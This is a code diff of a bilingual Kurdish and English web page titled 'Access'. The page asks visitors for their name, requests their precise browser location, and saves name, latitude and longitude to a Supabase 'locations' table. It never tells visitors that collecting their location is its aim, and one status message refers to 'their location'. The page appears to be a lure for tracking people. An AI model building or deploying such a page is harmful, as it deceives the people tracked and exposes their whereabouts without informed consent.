@@ -4,11 +4,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
   <title>Access</title>
 
   <style>
-
     :root {
       --bg: #0f172a;
       --card: #1e293b;
@@ -33,53 +31,36 @@
       background-color: var(--bg);
       color: var(--text);
       font-family: Arial, sans-serif;
-
       display: flex;
       justify-content: center;
       align-items: center;
-
       min-height: 100vh;
-
       margin: 0;
       padding: 20px;
     }
 
     .card {
       background: var(--card);
-
       max-width: 420px;
       width: 100%;
-
       padding: 30px;
-
       border-radius: 16px;
-
-      box-shadow:
-        0 10px 25px rgba(0,0,0,0.5);
-
+      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
       text-align: center;
     }
 
     h2 {
       margin-top: 0;
       margin-bottom: 12px;
-
       color: var(--text);
     }
 
     p {
       color: var(--muted);
-
       font-size: 14px;
-
       line-height: 1.7;
-
       margin-bottom: 20px;
     }
-
-    /* =========================
-       LANGUAGE SCREEN
-    ========================== */
 
     #languageScreen {
       display: block;
@@ -87,74 +68,47 @@
 
     .language-buttons {
       display: flex;
-
       gap: 12px;
-
       margin-top: 20px;
     }
 
     .language-btn {
       flex: 1;
-
       padding: 13px;
-
       border: 1px solid var(--border);
-
       border-radius: 10px;
-
       background: var(--input);
-
       color: var(--text);
-
       font-size: 15px;
-
       font-weight: bold;
-
       cursor: pointer;
-
       transition: 0.2s;
     }
 
     .language-btn:hover {
       background: var(--gray);
-
       border-color: var(--blue);
     }
 
     .language-btn.active {
       background: var(--blue);
-
       border-color: var(--blue);
     }
-
-    /* =========================
-       NAME SCREEN
-    ========================== */
 
     #nameScreen {
       display: none;
     }
 
     input[type="text"] {
-
       width: 100%;
-
       padding: 12px;
-
       margin-bottom: 15px;
-
       border: 1px solid var(--border);
-
       border-radius: 8px;
-
       background: var(--input);
-
       color: #fff;
-
       font-size: 15px;
-
       text-align: center;
-
       outline: none;
     }
 
@@ -163,35 +117,23 @@
     }
 
     .btn-group {
-
       display: flex;
-
       gap: 10px;
     }
 
     button.action-btn {
-
       flex: 1;
-
       padding: 12px;
-
       border: none;
-
       border-radius: 8px;
-
       font-size: 15px;
-
       font-weight: bold;
-
       cursor: pointer;
-
       transition: background 0.2s;
     }
 
     #allow {
-
       background: var(--blue);
-
       color: white;
     }
 
@@ -200,9 +142,7 @@
     }
 
     #deny {
-
       background: var(--gray);
-
       color: #cbd5e1;
     }
 
@@ -211,45 +151,31 @@
     }
 
     button:disabled {
-
       opacity: 0.6;
-
       cursor: not-allowed;
     }
 
     #result {
-
       margin-top: 20px;
-
       font-size: 14px;
-
       line-height: 1.6;
-
       word-break: break-word;
     }
 
     .change-language {
-
       margin-top: 18px;
-
       background: transparent;
-
       border: none;
-
       color: var(--muted);
-
       font-size: 13px;
-
       cursor: pointer;
     }
 
     .change-language:hover {
-
       color: white;
     }
 
     @media (max-width: 480px) {
-
       .card {
         padding: 24px 20px;
       }
@@ -258,744 +184,241 @@
       .btn-group {
         flex-direction: column;
       }
-
     }
-
   </style>
-
 </head>
-
 
 <body>
 
-
   <div class="card">
 
-
-    <!-- ==================================================
-         LANGUAGE SELECTION
-    =================================================== -->
-
+    <!-- LANGUAGE SELECTION -->
     <div id="languageScreen">
-
-      <h2>
-        زمانەکە هەڵبژێرە / Choose your language
-      </h2>
-
-      <p>
-        تکایە زمانەکەت هەڵبژێرە / Please choose your language
-      </p>
-
-
+      <h2>زمانەکە هەڵبژێرە / Choose your language</h2>
+      <p>تکایە زمانەکەت هەڵبژێرە / Please choose your language</p>
       <div class="language-buttons">
-
-        <button
-          type="button"
-          class="language-btn"
-          id="kurdishBtn"
-        >
-          کوردی
-        </button>
-
-
-        <button
-          type="button"
-          class="language-btn"
-          id="englishBtn"
-        >
-          English
-        </button>
-
+        <button type="button" class="language-btn" id="kurdishBtn">کوردی</button>
+        <button type="button" class="language-btn" id="englishBtn">English</button>
       </div>
-
     </div>
 
-
-    <!-- ==================================================
-         NAME + LOCATION
-    =================================================== -->
-
+    <!-- NAME + LOCATION -->
     <div id="nameScreen">
+      <h2 id="title">چونەژوورەوە</h2>
+      <p id="description">تکایە ناوەکەت بنووسە و کلیک لە بەردەوام بوون بکە.</p>
 
-
-      <h2 id="title">
-        چونەژوورەوە
-      </h2>
-
-
-      <p id="description">
-        تکایە ناوەکەت بنووسە و کلیک لە بەردەوام بوون بکە.
-      </p>
-
-
-      <input
-        type="text"
-        id="username"
-        placeholder="ناوەکەت بنووسە..."
-        autocomplete="name"
-      >
-
+      <input type="text" id="username" placeholder="ناوەکەت بنووسە..." autocomplete="name">
 
       <div class="btn-group">
-
-
-        <button
-          type="button"
-          class="action-btn"
-          id="allow"
-        >
-          بەردەوام بوون
-        </button>
-
-
-        <button
-          type="button"
-          class="action-btn"
-          id="deny"
-        >
-          ڕەتکردنەوە
-        </button>
-
-
+        <button type="button" class="action-btn" id="allow">بەردەوام بوون</button>
+        <button type="button" class="action-btn" id="deny">ڕەتکردنەوە</button>
       </div>
-
 
       <div id="result"></div>
 
-
-      <button
-        type="button"
-        class="change-language"
-        id="changeLanguage"
-      >
-        گۆڕینی زمان
-      </button>
-
-
+      <button type="button" class="change-language" id="changeLanguage">گۆڕینی زمان</button>
     </div>
-
 
   </div>
 
-
-  <!-- ==================================================
-       SUPABASE
-  =================================================== -->
-
+  <!-- SUPABASE -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
-
   <script>
+    const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
+    const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
 
+    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    // ==================================================
-    // SUPABASE SETUP
-    // ==================================================
+    // ** لینکی وێنەکەی تۆ **
+    const SUCCESS_IMAGE_URL = "https://i.ibb.co/q3Ph1yHV/IMG-3338.png";
 
-    const SUPABASE_URL =
-      "https://mxichdljcrlcomnhkcin.supabase.co";
-
-
-    const SUPABASE_KEY =
-      "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
-
-
-    const supabaseClient =
-      window.supabase.createClient(
-        SUPABASE_URL,
-        SUPABASE_KEY
-      );
-
-
-    // ==================================================
-    // ELEMENTS
-    // ==================================================
-
-    const languageScreen =
-      document.getElementById("languageScreen");
-
-
-    const nameScreen =
-      document.getElementById("nameScreen");
-
-
-    const kurdishBtn =
-      document.getElementById("kurdishBtn");
-
-
-    const englishBtn =
-      document.getElementById("englishBtn");
-
-
-    const title =
-      document.getElementById("title");
-
-
-    const description =
-      document.getElementById("description");
-
-
-    const usernameInput =
-      document.getElementById("username");
-
-
-    const allowButton =
-      document.getElementById("allow");
-
-
-    const denyButton =
-      document.getElementById("deny");
-
-
-    const result =
-      document.getElementById("result");
-
-
-    const changeLanguage =
-      document.getElementById("changeLanguage");
-
-
-    // ==================================================
-    // TRANSLATIONS
-    // ==================================================
+    const languageScreen = document.getElementById("languageScreen");
+    const nameScreen = document.getElementById("nameScreen");
+    const kurdishBtn = document.getElementById("kurdishBtn");
+    const englishBtn = document.getElementById("englishBtn");
+    const title = document.getElementById("title");
+    const description = document.getElementById("description");
+    const usernameInput = document.getElementById("username");
+    const allowButton = document.getElementById("allow");
+    const denyButton = document.getElementById("deny");
+    const result = document.getElementById("result");
+    const changeLanguage = document.getElementById("changeLanguage");
 
     const translations = {
-
-
       ku: {
-
         direction: "rtl",
-
-        title:
-          "چونەژوورەوە",
-
-        description:
-          "تکایە ناوەکەت بنووسە و کلیک لە بەردەوام بوون بکە.",
-
-        placeholder:
-          "ناوەکەت بنووسە...",
-
-        allow:
-          "بەردەوام بوون",
-
-        deny:
-          "ڕەتکردنەوە",
-
-        change:
-          "گۆڕینی زمان",
-
-        emptyName:
-          "❌ تکایە پێشتر ناوەکەت بنووسە!",
-
-        noLocation:
-          "❌ پێگەڕەکەت پشتیوانی وەرگرتنی شوێن ناکات.",
-
-        requesting:
-          "⏳ داواکاری وەرگرتنی شوێنەکەی دەکرێت...",
-
-        saving:
-          "⏳ شوێنەکەی وەرگیراوە، لە داتابەیس تۆمار دەکرێت...",
-
-        success:
-          "✅ بە سەرکەوتوویی لە داتابەیس تۆمارکرا!",
-
-        databaseError:
-          "⚠️ شوێنەکەی وەرگیرا، بەڵام لە داتابەیس تۆمار نەکرا!",
-
-        permissionDenied:
-          "❌ ڕێگەپێدانی شوێن ڕەتکرایەوە. تکایە Allow بکە.",
-
-        unavailable:
-          "❌ زانیاری شوێنەکەی بەردەست نییە.",
-
-        timeout:
-          "❌ وەرگرتنی شوێن کاتی بەسەرچوو.",
-
-        unknown:
-          "❌ هەڵەیەکی نەزانراو ڕووی دا.",
-
-        cancelled:
-          "ڕەتکردنەوە هەڵبژێردرا."
-
+        title: "چونەژوورەوە",
+        description: "تکایە ناوەکەت بنووسە و کلیک لە بەردەوام بوون بکە.",
+        placeholder: "ناوەکەت بنووسە...",
+        allow: "بەردەوام بوون",
+        deny: "ڕەتکردنەوە",
+        change: "گۆڕینی زمان",
+        emptyName: "❌ تکایە پێشتر ناوەکەت بنووسە!",
+        noLocation: "❌ پێگەڕەکەت پشتیوانی وەرگرتنی شوێن ناکات.",
+        requesting: "⏳ داواکاری وەرگرتنی شوێنەکەی دەکرێت...",
+        saving: "⏳ شوێنەکەی وەرگیراوە، لە داتابەیس تۆمار دەکرێت...",
+        success: "✅ بە سەرکەوتوویی لە داتابەیس تۆمارکرا!",
+        databaseError: "⚠️ شوێنەکەی وەرگیرا، بەڵام لە داتابەیس تۆمار نەکرا!",
+        permissionDenied: "❌ ڕێگەپێدانی شوێن ڕەتکرایەوە. تکایە Allow بکە.",
+        unavailable: "❌ زانیاری شوێنەکەی بەردەست نییە.",
+        timeout: "❌ وەرگرتنی شوێن کاتی بەسەرچوو.",
+        unknown: "❌ هەڵەیەکی نەزانراو ڕووی دا.",
+        cancelled: "ڕەتکردنەوە هەڵبژێردرا."
       },
-
-
       en: {
-
         direction: "ltr",
-
-        title:
-          "Access",
-
-        description:
-          "Please enter your name and click Continue.",
-
-        placeholder:
-          "Enter your name...",
-
-        allow:
-          "Continue",
-
-        deny:
-          "Cancel",
-
-        change:
-          "Change language",
-
-        emptyName:
-          "❌ Please enter your name first!",
-
-        noLocation:
-          "❌ Your browser does not support location services.",
-
-        requesting:
-          "⏳ Requesting their location...",
-
-        saving:
-          "⏳ Location received. Saving to the database...",
-
-        success:
-          "✅ Successfully saved to the database!",
-
-        databaseError:
-          "⚠️ Location was received, but it could not be saved to the database.",
-
-        permissionDenied:
-          "❌ Location permission was denied. Please allow location access.",
-
-        unavailable:
-          "❌ Your location is currently unavailable.",
-
-        timeout:
-          "❌ The location request timed out.",
-
-        unknown:
-          "❌ An unknown error occurred.",
-
-        cancelled:
-          "Cancellation selected."
-
+        title: "Access",
+        description: "Please enter your name and click Continue.",
+        placeholder: "Enter your name...",
+        allow: "Continue",
+        deny: "Cancel",
+        change: "Change language",
+        emptyName: "❌ Please enter your name first!",
+        noLocation: "❌ Your browser does not support location services.",
+        requesting: "⏳ Requesting their location...",
+        saving: "⏳ Location received. Saving to the database...",
+        success: "✅ Successfully saved to the database!",
+        databaseError: "⚠️ Location was received, but it could not be saved to the database.",
+        permissionDenied: "❌ Location permission was denied. Please allow location access.",
+        unavailable: "❌ Your location is currently unavailable.",
+        timeout: "❌ The location request timed out.",
+        unknown: "❌ An unknown error occurred.",
+        cancelled: "Cancellation selected."
       }
-
     };
-
-
-    // ==================================================
-    // CURRENT LANGUAGE
-    // ==================================================
 
     let currentLanguage = "ku";
 
-
-    // ==================================================
-    // SET LANGUAGE
-    // ==================================================
-
     function setLanguage(language) {
+      currentLanguage = translations[language] ? language : "ku";
+      const t = translations[currentLanguage];
 
+      document.documentElement.lang = currentLanguage;
+      document.documentElement.dir = t.direction;
 
-      currentLanguage =
-        translations[language]
-          ? language
-          : "ku";
+      title.textContent = t.title;
+      description.textContent = t.description;
+      usernameInput.placeholder = t.placeholder;
+      allowButton.textContent = t.allow;
+      denyButton.textContent = t.deny;
+      changeLanguage.textContent = t.change;
 
-
-      const t =
-        translations[currentLanguage];
-
-
-      // HTML direction
-
-      document.documentElement.lang =
-        currentLanguage;
-
-
-      document.documentElement.dir =
-        t.direction;
-
-
-      // Text
-
-      title.textContent =
-        t.title;
-
-
-      description.textContent =
-        t.description;
-
-
-      usernameInput.placeholder =
-        t.placeholder;
-
-
-      allowButton.textContent =
-        t.allow;
-
-
-      denyButton.textContent =
-        t.deny;
-
-
-      changeLanguage.textContent =
-        t.change;
-
-
-      // Active button
-
-      kurdishBtn.classList.toggle(
-        "active",
-        currentLanguage === "ku"
-      );
-
-
-      englishBtn.classList.toggle(
-        "active",
-        currentLanguage === "en"
-      );
-
-
-      // Clear previous result
+      kurdishBtn.classList.toggle("active", currentLanguage === "ku");
+      englishBtn.classList.toggle("active", currentLanguage === "en");
 
       result.innerHTML = "";
-
     }
 
+    kurdishBtn.addEventListener("click", function () {
+      setLanguage("ku");
+      languageScreen.style.display = "none";
+      nameScreen.style.display = "block";
+      usernameInput.focus();
+    });
 
-    // ==================================================
-    // KURDISH
-    // ==================================================
+    englishBtn.addEventListener("click", function () {
+      setLanguage("en");
+      languageScreen.style.display = "none";
+      nameScreen.style.display = "block";
+      usernameInput.focus();
+    });
 
-    kurdishBtn.addEventListener(
-      "click",
-      function () {
+    changeLanguage.addEventListener("click", function () {
+      nameScreen.style.display = "none";
+      languageScreen.style.display = "block";
+      result.innerHTML = "";
+    });
 
-        setLanguage("ku");
+    allowButton.addEventListener("click", function () {
+      const t = translations[currentLanguage];
+      const name = usernameInput.value.trim();
 
-
-        languageScreen.style.display =
-          "none";
-
-
-        nameScreen.style.display =
-          "block";
-
-
-        usernameInput.focus();
-
+      if (!name) {
+        result.innerHTML = `<span style="color:#ef4444;">${t.emptyName}</span>`;
+        return;
       }
-    );
 
-
-    // ==================================================
-    // ENGLISH
-    // ==================================================
-
-    englishBtn.addEventListener(
-      "click",
-      function () {
-
-        setLanguage("en");
-
-
-        languageScreen.style.display =
-          "none";
-
-
-        nameScreen.style.display =
-          "block";
-
-
-        usernameInput.focus();
-
+      if (!navigator.geolocation) {
+        result.innerHTML = `<span style="color:#ef4444;">${t.noLocation}</span>`;
+        return;
       }
-    );
 
+      allowButton.disabled = true;
+      denyButton.disabled = true;
 
-    // ==================================================
-    // CHANGE LANGUAGE
-    // ==================================================
+      result.innerHTML = `<span style="color:#3b82f6;">${t.requesting}</span>`;
 
-    changeLanguage.addEventListener(
-      "click",
-      function () {
+      navigator.geolocation.getCurrentPosition(
+        async function (position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
 
-        nameScreen.style.display =
-          "none";
+          result.innerHTML = `<span style="color:#3b82f6;">${t.saving}</span>`;
 
+          try {
+            const { error } = await supabaseClient
+              .from("locations")
+              .insert([{ name: name, latitude: latitude, longitude: longitude }]);
 
-        languageScreen.style.display =
-          "block";
-
-
-        result.innerHTML = "";
-
-      }
-    );
-
-
-    // ==================================================
-    // CONTINUE / LOCATION
-    // ==================================================
-
-    allowButton.addEventListener(
-      "click",
-      function () {
-
-
-        const t =
-          translations[currentLanguage];
-
-
-        const name =
-          usernameInput.value.trim();
-
-
-        // NAME CHECK
-
-        if (!name) {
-
-          result.innerHTML =
-            `<span style="color:#ef4444;">
-              ${t.emptyName}
-            </span>`;
-
-          return;
-        }
-
-
-        // LOCATION SUPPORT CHECK
-
-        if (!navigator.geolocation) {
-
-          result.innerHTML =
-            `<span style="color:#ef4444;">
-              ${t.noLocation}
-            </span>`;
-
-          return;
-        }
-
-
-        // Disable buttons
-
-        allowButton.disabled =
-          true;
-
-
-        denyButton.disabled =
-          true;
-
-
-        // Request location
-
-        result.innerHTML =
-          `<span style="color:#3b82f6;">
-            ${t.requesting}
-          </span>`;
-
-
-        navigator.geolocation.getCurrentPosition(
-
-
-          // SUCCESS
-
-          async function(position) {
-
-
-            const latitude =
-              position.coords.latitude;
-
-
-            const longitude =
-              position.coords.longitude;
-
-
-            result.innerHTML =
-              `<span style="color:#3b82f6;">
-                ${t.saving}
-              </span>`;
-
-
-            try {
-
-
-              // Save to Supabase
-
-              const { error } =
-                await supabaseClient
-
-                  .from("locations")
-
-                  .insert([
-
-                    {
-                      name: name,
-                      latitude: latitude,
-                      longitude: longitude
-                    }
-
-                  ]);
-
-
-              // Database error
-
-              if (error) {
-
-                console.error(
-                  "Supabase Error:",
-                  error
-                );
-
-
-                result.innerHTML =
-                  `<span style="color:#f59e0b;">
-                    ${t.databaseError}
-                  </span>`;
-
-                return;
-              }
-
-
-              // Success
-
-              result.innerHTML =
-                `<span style="color:#22c55e;">
-                  ${t.success}
-                </span>`;
-
-
+            if (error) {
+              console.error("Supabase Error:", error);
+              result.innerHTML = `<span style="color:#f59e0b;">${t.databaseError}</span>`;
+              return;
             }
 
-            catch (error) {
+            // ** نیشاندانی سەرکەوتن و وێنەکە **
+            result.innerHTML = `
+              <div style="text-align: center; margin-top: 15px;">
+                <p style="color:#22c55e; font-weight: bold; margin-bottom: 10px;">${t.success}</p>
+                <img 
+                  src="${SUCCESS_IMAGE_URL}" 
+                  alt="Success Photo" 
+                  style="width: 100%; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.4);" 
+                />
+              </div>
+            `;
 
-
-              console.error(
-                "Unexpected error:",
-                error
-              );
-
-
-              result.innerHTML =
-                `<span style="color:#f59e0b;">
-                  ${t.databaseError}
-                </span>`;
-
-            }
-
-
-            finally {
-
-              allowButton.disabled =
-                false;
-
-              denyButton.disabled =
-                false;
-
-            }
-
-          },
-
-
-          // ERROR
-
-          function(error) {
-
-
-            let message =
-              t.unknown;
-
-
-            switch (error.code) {
-
-
-              case error.PERMISSION_DENIED:
-
-                message =
-                  t.permissionDenied;
-
-                break;
-
-
-              case error.POSITION_UNAVAILABLE:
-
-                message =
-                  t.unavailable;
-
-                break;
-
-
-              case error.TIMEOUT:
-
-                message =
-                  t.timeout;
-
-                break;
-
-            }
-
-
-            result.innerHTML =
-              `<span style="color:#ef4444;">
-                ${message}
-              </span>`;
-
-
-            allowButton.disabled =
-              false;
-
-
-            denyButton.disabled =
-              false;
-
-          },
-
-
-          // OPTIONS
-
-          {
-
-            enableHighAccuracy: true,
-
-            timeout: 15000,
-
-            maximumAge: 0
-
+          } catch (error) {
+            console.error("Unexpected error:", error);
+            result.innerHTML = `<span style="color:#f59e0b;">${t.databaseError}</span>`;
+          } finally {
+            allowButton.disabled = false;
+            denyButton.disabled = false;
+          }
+        },
+        function (error) {
+          let message = t.unknown;
+          switch (error.code) {
+            case error.PERMISSION_DENIED:
+              message = t.permissionDenied;
+              break;
+            case error.POSITION_UNAVAILABLE:
+              message = t.unavailable;
+              break;
+            case error.TIMEOUT:
+              message = t.timeout;
+              break;
           }
 
-        );
+          result.innerHTML = `<span style="color:#ef4444;">${message}</span>`;
+          allowButton.disabled = false;
+          denyButton.disabled = false;
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        }
+      );
+    });
 
-      }
-    );
-
-
-    // ==================================================
-    // CANCEL
-    // ==================================================
-
-    denyButton.addEventListener(
-      "click",
-      function () {
-
-
-        const t =
-          translations[currentLanguage];
-
-
-        result.innerHTML =
-          `<span style="color:#94a3b8;">
-            ${t.cancelled}
-          </span>`;
-
-      }
-    );
-
-
-    // ==================================================
-    // START
-    // ==================================================
+    denyButton.addEventListener("click", function () {
+      const t = translations[currentLanguage];
+      result.innerHTML = `<span style="color:#94a3b8;">${t.cancelled}</span>`;
+    });
 
     setLanguage("ku");
-
   </script>
 
 </body>
